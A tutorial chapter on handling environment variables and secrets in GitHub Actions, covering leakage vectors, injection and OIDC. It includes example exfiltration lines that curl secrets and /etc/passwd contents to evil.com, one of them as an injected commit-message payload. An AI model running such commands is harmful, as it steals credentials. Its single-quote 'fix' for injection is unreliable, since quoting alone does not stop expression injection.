# Chapter 5: Environment Variables and Secrets Handling

## Mental Model

**Environment variables = Job configuration**  
**Secrets = Encrypted variables with strict access control**

## Environment Variables

**Definition:**
```yaml
env:
  NODE_ENV: production
  API_URL: https://api.prod.com

jobs:
  test:
    env:
      TEST_TIMEOUT: 5000  # Job-specific
    steps:
      - run: echo $NODE_ENV  # "production"
```

**Scope hierarchy:**
1. Workflow-level (global)
2. Job-level (overrides workflow)
3. Step-level (overrides job)

## Secrets

**Storage:**
```yaml
jobs:
  deploy:
    steps:
      - run: |
          echo ${{ secrets.API_KEY }}  # Masked in logs
```

**Critical properties:**
1. **Encrypted at rest** (AES-256)
2. **Masked in logs** (automatically)
3. **Decrypted only in runner** (in-memory)
4. **Not accessible in forks** (security boundary)

## Secret Leakage Vectors

### Vector 1: Base64 encoding
```yaml
- run: echo ${{ secrets.TOKEN }} | base64
# Logs: dGhpc2lzbXlzZWNyZXQ= (visible!)
```

**Why:** Masking looks for literal secret string. Base64 bypasses it.

### Vector 2: Substring extraction
```yaml
- run: echo "${SECRET:0:5}"  # First 5 chars visible
```

### Vector 3: HTTP exfiltration
```yaml
- run: curl https://evil.com?key=${{ secrets.API_KEY }}
# Secret sent to attacker's server
```

### Vector 4: Artifact upload
```yaml
- run: echo ${{ secrets.KEY }} > secret.txt
- uses: actions/upload-artifact@v3
  with:
    path: secret.txt  # Secret now in artifact!
```

## Third-Party Action Risks

```yaml
- uses: sketchy-action/deploy@v1
  with:
    api_key: ${{ secrets.API_KEY }}
  # This action can exfiltrate your secret!
```

**Mitigation:**
- Pin to commit SHA: `uses: owner/action@a1b2c3d`
- Review action code
- Use only verified actions
- Limit secret access

## Environment Injection Attacks

**Vulnerable:**
```yaml
- run: |
    COMMIT_MSG="${{ github.event.head_commit.message }}"
    echo "Building: $COMMIT_MSG"
```

**Attack:**
```bash
# Attacker pushes commit with message:
"; curl evil.com?data=$(cat /etc/passwd);"
```

**Fix:** Always quote and validate:
```yaml
- run: |
    COMMIT_MSG='${{ github.event.head_commit.message }}'
    echo "Building: $COMMIT_MSG"
```

## Secret Rotation

**Problem:** Secrets never expire in CI

**Best practice:**
1. Rotate regularly (e.g., monthly)
2. Use short-lived tokens (OIDC)
3. Audit secret access
4. Revoke on suspicion

## OIDC (Modern approach)

**Traditional:**
```yaml
- run: aws deploy --key ${{ secrets.AWS_KEY }}
# Long-lived credential
```

**OIDC:**
```yaml
permissions:
  id-token: write  # Request token
steps:
  - uses: aws-actions/configure-aws-credentials@v2
    with:
      role-to-assume: arn:aws:iam::123456789012:role/GitHubActions
  # No secrets stored! Token valid for job duration only
```

**Benefits:**
- No stored credentials
- Auto-expiring tokens
- Auditable (who accessed what, when)

## Interview Questions

**Q1:** Secret masked in logs but still leaked. How?

**A:** 
- Base64 encoding
- Substring extraction
- HTTP exfiltration
- Artifact upload
- Output via third-party action

**Q2:** PR from fork can access repository secrets?

**A:** **No** (for security). Forks get: read-only `GITHUB_TOKEN`, no repository secrets. This prevents malicious PRs from stealing secrets.

**Q3:** Why use OIDC instead of storing AWS keys?

**A:**
- No long-lived credentials
- Auto-expiring tokens
- Can't be exfiltrated and reused
- Granular permissions via IAM roles
- Full audit trail

## Key Takeaways

- Secrets encrypted at rest, masked in logs
- Masking can be bypassed (base64, substrings, HTTP)
- Third-party actions can exfiltrate secrets
- Forks don't get repository secrets
- OIDC > stored credentials
- Always validate/sanitize user input
